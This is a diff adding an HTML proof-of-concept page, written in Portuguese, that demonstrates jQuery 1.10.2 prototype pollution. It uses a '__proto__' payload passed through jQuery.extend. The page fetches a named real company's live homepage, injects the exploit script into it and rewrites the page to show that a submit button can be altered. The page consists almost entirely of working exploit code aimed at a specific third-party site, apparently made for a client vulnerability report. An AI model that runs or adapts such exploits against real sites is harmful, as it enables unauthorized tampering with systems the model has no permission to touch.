@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>PoC - jQuery Prototype Pollution</title>
+    <script src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
+  </head>
+  <body>
+    <h1>PoC - jQuery Prototype Pollution</h1>
+    <p>Este PoC demonstra a vulnerabilidade de poluição de protótipo do jQuery no site do cliente.</p>
+    <button onclick="sendExploit()">Enviar Exploit</button>
+    <script>
+      const payload = '{"__proto__":{"polluted":true}}';
+
+      function exploit() {
+        jQuery.extend(true, {}, JSON.parse(payload));
+        if ({}["polluted"] === true) {
+          changeSubmitButtonText();
+        }
+      }
+
+      function changeSubmitButtonText() {
+        const button = document.querySelector(".fullscreen-keyvisual-search-submit-label");
+        if (button) {
+          button.innerText = "Texto alterado - Vulnerável";
+          alert("Botão de envio do formulário de avaliação alterado devido à vulnerabilidade");
+        } else {
+          alert("Elemento do botão de envio não encontrado, tente atualizar a página e executar o PoC novamente");
+        }
+      }
+
+      function sendExploit() {
+        const xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function() {
+          if (this.readyState === 4 && this.status === 200) {
+            const parser = new DOMParser();
+            const responseDoc = parser.parseFromString(this.responseText, "text/html");
+            const scriptTag = responseDoc.createElement("script");
+            scriptTag.innerHTML = `(${exploit.toString()})();`;
+            responseDoc.body.appendChild(scriptTag);
+            document.write(responseDoc.documentElement.outerHTML);
+          }
+        };
+        xhttp.open("GET", "https://www.engelvoelkers.com/hp/", true);
+        xhttp.send();
+      }
+    </script>
+  </body>
+</html>
